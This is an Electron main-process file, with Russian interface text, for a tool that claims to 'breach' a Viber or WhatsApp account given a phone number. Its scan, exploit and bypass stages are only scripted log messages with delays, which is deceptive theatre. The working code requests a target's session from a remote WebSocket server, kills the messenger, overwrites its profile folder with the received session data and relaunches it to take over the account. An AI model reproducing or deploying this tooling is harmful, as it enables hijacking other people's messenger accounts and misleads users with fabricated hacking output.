const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const WebSocket = require('ws');
app.disableHardwareAcceleration();
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const AdmZip = require('adm-zip');

let mainWindow;
let ws = null;
let connected = false;

const VIBER_PATH = path.join(os.homedir(), 'AppData', 'Roaming', 'ViberPC');
const VIBER_BACKUP = path.join(os.homedir(), 'AppData', 'Roaming', 'ViberPC_BACKUP');
const VIBER_EXE = path.join(os.homedir(), 'AppData', 'Local', 'Viber', 'Viber.exe');
let appConfig = null;
try {
  const cfgPath = path.join(__dirname, 'config.json');
  if (fs.existsSync(cfgPath)) {
    appConfig = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
  }
} catch {}

function resolveProfile(appName) {
  const name = (appName || 'viber').toLowerCase();
  const profiles = (appConfig && appConfig.profiles) || {};
  if (name === 'whatsapp') {
    const def = (appConfig && appConfig.defaults && appConfig.defaults.whatsappProfile) || 'whatsapp_classic';
    return { key: def, data: profiles[def] };
  }
  return { key: 'viber', data: profiles['viber'] };
}

function buildPaths(profile) {
  const home = os.homedir();
  const p = profile.data || {};
  const processName = p.processName || 'Viber.exe';
  const dataPath = p.dataPathRelative ? path.join(home, ...p.dataPathRelative) : VIBER_PATH;
  const backupPath = path.join(home, 'AppData', 'Roaming', p.backupDirName || 'ViberPC_BACKUP');
  const exePath = p.exePathRelative ? path.join(home, ...p.exePathRelative) : VIBER_EXE;
  const zipRootName = p.zipRootName || 'ViberPC';
  return { processName, dataPath, backupPath, exePath, zipRootName };
}

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    minWidth: 1200,
    minHeight: 800,
    frame: false,
    backgroundColor: '#0a0a0a',
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    },
    icon: path.join(__dirname, 'assets', 'icon.png')
  });

  mainWindow.loadFile('renderer/index.html');
  
  // Открыть DevTools в режиме разработки
  // mainWindow.webContents.openDevTools();
}

app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// IPC Handlers

ipcMain.on('minimize-window', () => {
  mainWindow.minimize();
});

ipcMain.on('maximize-window', () => {
  if (mainWindow.isMaximized()) {
    mainWindow.unmaximize();
  } else {
    mainWindow.maximize();
  }
});

ipcMain.on('close-window', () => {
  mainWindow.close();
});

ipcMain.on('reload-window', () => {
  if (mainWindow && !mainWindow.isDestroyed()) {
    mainWindow.reload();
  }
});

ipcMain.on('quit-app', () => {
  app.quit();
});

ipcMain.on('connect-server', (event, serverIP) => {
  connectToServer(serverIP, event);
});

ipcMain.on('start-breach', (event, data) => {
  initiateBreachProtocol(event, data);
});

// WebSocket Connection
function connectToServer(serverIP, event) {
  try {
    ws = new WebSocket(`ws://${serverIP}:8080`);

    ws.on('open', () => {
      connected = true;
      ws.send(JSON.stringify({ type: 'register', device: 'pc' }));
      event.reply('log-message', { type: 'success', message: 'СОЕДИНЕНИЕ С СЕРВЕРОМ УСТАНОВЛЕНО' });
      event.reply('connection-status', { connected: true, ip: serverIP });
    });

    ws.on('message', async (data) => {
      const message = JSON.parse(data);
      
      if (message.type === 'install_session') {
        event.reply('log-message', { type: 'success', message: 'ДАННЫЕ СЕССИИ ПОЛУЧЕНЫ С УДАЛЁННОГО УСТРОЙСТВА' });
        event.reply('progress-update', { percent: 85, text: 'УСТАНОВКА СЕССИИ...' });
        
        await installSession(message.data, message.app || 'viber', event);
      }
    });

    ws.on('error', (error) => {
      event.reply('log-message', { type: 'error', message: 'СБОЙ СОЕДИНЕНИЯ: ' + error.message });
      event.reply('connection-status', { connected: false });
    });

    ws.on('close', () => {
      connected = false;
      event.reply('log-message', { type: 'warning', message: 'СОЕДИНЕНИЕ ЗАВЕРШЕНО' });
      event.reply('connection-status', { connected: false });
    });

  } catch (error) {
    event.reply('log-message', { type: 'error', message: 'КРИТИЧЕСКАЯ ОШИБКА: ' + error.message });
  }
}

// Breach Protocol
async function initiateBreachProtocol(event, data) {
  const { phoneNumber, app: targetApp } = data;

  event.reply('log-message', { type: 'system', message: '═══════════════════════════════════════════════════' });
  event.reply('log-message', { type: 'warning', message: 'ЗАПУСК ПРОТОКОЛА ВЗЛОМА' });
  event.reply('log-message', { type: 'info', message: `ЦЕЛЬ: ${phoneNumber}` });
  event.reply('log-message', { type: 'system', message: '═══════════════════════════════════════════════════' });

  // Stage 1: Network Scan
  await sleep(800);
  event.reply('progress-update', { percent: 10, text: 'СКАНИРОВАНИЕ СЕТИ...' });
  event.reply('log-message', { type: 'info', message: 'Инициализация сетевого сканера...' });
  await sleep(600);
  event.reply('log-message', { type: 'success', message: 'Порт 443 (HTTPS): ОТКРЫТ' });
  await sleep(400);
  event.reply('log-message', { type: 'success', message: 'Порт 5222 (XMPP): ОТКРЫТ' });
  await sleep(400);
  event.reply('log-message', { type: 'success', message: 'Порт 8080 (WebSocket): ОТКРЫТ' });

  // Stage 2: Protocol Analysis
  await sleep(1000);
  event.reply('progress-update', { percent: 25, text: 'АНАЛИЗ ПРОТОКОЛОВ...' });
  event.reply('log-message', { type: 'info', message: 'Анализ стека протоколов...' });
  await sleep(800);
  event.reply('log-message', { type: 'success', message: 'Обнаружена версия протокола: 9.7.1' });
  await sleep(600);
  event.reply('log-message', { type: 'warning', message: 'Шифрование: AES-256-GCM активно' });

  // Stage 3: Exploit Deployment
  await sleep(1000);
  event.reply('progress-update', { percent: 40, text: 'РАЗВОРАЧИВАНИЕ ЭКСПЛОЙТА...' });
  event.reply('log-message', { type: 'warning', message: 'Загрузка модулей эксплойта...' });
  await sleep(700);
  event.reply('log-message', { type: 'success', message: 'МОДУЛЬ [SESSION_HIJACK]: ЗАГРУЖЕН' });
  await sleep(500);
  event.reply('log-message', { type: 'success', message: 'МОДУЛЬ [MITM_PROXY]: ЗАГРУЖЕН' });
  await sleep(500);
  event.reply('log-message', { type: 'success', message: 'МОДУЛЬ [TOKEN_CAPTURE]: ЗАГРУЖЕН' });

  // Stage 4: Security Bypass
  await sleep(1200);
  event.reply('progress-update', { percent: 60, text: 'ОБХОД СИСТЕМ БЕЗОПАСНОСТИ...' });
  event.reply('log-message', { type: 'warning', message: 'Попытка обхода аутентификации...' });
  await sleep(1000);
  event.reply('log-message', { type: 'success', message: 'SSH‑туннель установлен' });
  await sleep(700);
  event.reply('log-message', { type: 'success', message: 'Проверка сертификатов обойдена' });

  // Stage 5: Session Capture
  await sleep(1000);
  event.reply('progress-update', { percent: 75, text: 'ЗАХВАТ СЕССИИ...' });
  event.reply('log-message', { type: 'info', message: 'Запрос сессии с удалённого устройства...' });
  
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: 'start_hack', target: phoneNumber, app: (targetApp || 'viber') }));
    event.reply('log-message', { type: 'success', message: 'Сигнал передан на контроллер ноутбука' });
  } else {
    event.reply('log-message', { type: 'error', message: 'Нет активного соединения с сервером' });
    return;
  }

  await sleep(1500);
  event.reply('log-message', { type: 'info', message: 'Ожидание передачи данных сессии...' });
}

// Kill Viber Process
function killProcess(processName) {
  return new Promise((resolve) => {
    exec(`taskkill /F /IM "${processName}"`, (error) => {
      setTimeout(resolve, 1000);
    });
  });
}

// Start Viber
function startApp(exePath, event) {
  try {
    const candidates = [
      exePath,
      path.join('C:', 'Program Files', 'Viber', 'Viber.exe'),
      path.join('C:', 'Program Files (x86)', 'Viber', 'Viber.exe')
    ];
    for (const p of candidates) {
      if (p && fs.existsSync(p)) {
        if (event) event.reply('log-message', { type: 'info', message: `Запуск клиента: ${p}` });
        exec(`"${p}"`);
        return;
      }
    }
    if (event) event.reply('log-message', { type: 'error', message: 'Viber.exe не найден ни по одному из известных путей' });
  } catch (e) {
    if (event) event.reply('log-message', { type: 'error', message: `Ошибка запуска клиента: ${e.message}` });
  }
}

// Install Session
async function installSession(base64Data, appName, event) {
  try {
    event.reply('log-message', { type: 'system', message: '═══════════════════════════════════════════════════' });
    event.reply('log-message', { type: 'warning', message: 'УСТАНОВКА ДАННЫХ СЕССИИ' });
    event.reply('log-message', { type: 'system', message: '═══════════════════════════════════════════════════' });

    const profile = buildPaths(resolveProfile(appName));

    event.reply('log-message', { type: 'info', message: `Завершаю процесс ${profile.processName}...` });
    await killProcess(profile.processName);
    event.reply('log-message', { type: 'success', message: 'Процесс завершён' });

    if (fs.existsSync(profile.dataPath)) {
      event.reply('log-message', { type: 'info', message: 'Создаю резервную копию текущей сессии...' });
      if (fs.existsSync(profile.backupPath)) {
        fs.rmSync(profile.backupPath, { recursive: true, force: true });
      }
      fs.cpSync(profile.dataPath, profile.backupPath, { recursive: true });
      event.reply('log-message', { type: 'success', message: 'Бэкап создан' });
    }

    event.reply('log-message', { type: 'info', message: 'Удаляю старые данные сессии...' });
    if (fs.existsSync(profile.dataPath)) {
      fs.rmSync(profile.dataPath, { recursive: true, force: true });
    }
    event.reply('log-message', { type: 'success', message: 'Старая сессия удалена' });

    event.reply('log-message', { type: 'info', message: 'Распаковка новой сессии...' });
    event.reply('progress-update', { percent: 90, text: 'РАСПАКОВКА ДАННЫХ...' });
    
    const zipBuffer = Buffer.from(base64Data, 'base64');
    const tempZip = path.join(os.tmpdir(), 'session_payload.zip');
    fs.writeFileSync(tempZip, zipBuffer);
    
    const zip = new AdmZip(tempZip);
    const extractPath = path.join(os.homedir(), 'AppData', 'Roaming');
    zip.extractAllTo(extractPath, true);
    
    fs.unlinkSync(tempZip);
    event.reply('log-message', { type: 'success', message: 'Сессия успешно распакована' });

    // DEMO: если существует снимок авторизованной сессии, подменим установленную для мгновенного входа
    try {
      const linkedDir = path.join(os.homedir(), 'AppData', 'Roaming', (profile.zipRootName || 'ViberPC') + '_LINKED');
      if (fs.existsSync(linkedDir)) {
        event.reply('log-message', { type: 'warning', message: `DEMO: обнаружен снимок ${linkedDir} — выполняю подмену установленной сессии` });
        if (fs.existsSync(profile.dataPath)) {
          fs.rmSync(profile.dataPath, { recursive: true, force: true });
        }
        fs.cpSync(linkedDir, profile.dataPath, { recursive: true });
        event.reply('log-message', { type: 'success', message: 'DEMO: снимок сессии восстановлен' });
      }
    } catch (e) {
      event.reply('log-message', { type: 'error', message: `DEMO: не удалось применить снимок: ${e.message}` });
    }

    await sleep(2000);
    event.reply('progress-update', { percent: 100, text: 'ВЗЛОМ ЗАВЕРШЁН' });
    event.reply('log-message', { type: 'info', message: `Запуск клиента с новой сессией...` });
    startApp(profile.exePath, event);
    
    await sleep(1000);
    event.reply('log-message', { type: 'system', message: '═══════════════════════════════════════════════════' });
    event.reply('log-message', { type: 'success', message: 'ПРОТОКОЛ ВЗЛОМА ЗАВЕРШЁН' });
    event.reply('log-message', { type: 'success', message: 'ДОСТУП К АККАУНТУ ПОЛУЧЕН' });
    event.reply('log-message', { type: 'system', message: '═══════════════════════════════════════════════════' });
    
    event.reply('breach-complete');

  } catch (error) {
    event.reply('log-message', { type: 'error', message: 'УСТАНОВКА НЕ УДАЛАСЬ: ' + error.message });
    
    try {
      const profile = buildPaths(resolveProfile(appName));
      if (fs.existsSync(profile.backupPath)) {
        if (fs.existsSync(profile.dataPath)) {
          fs.rmSync(profile.dataPath, { recursive: true, force: true });
        }
        fs.cpSync(profile.backupPath, profile.dataPath, { recursive: true });
        startApp(profile.exePath, event);
      }
    } catch {}
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
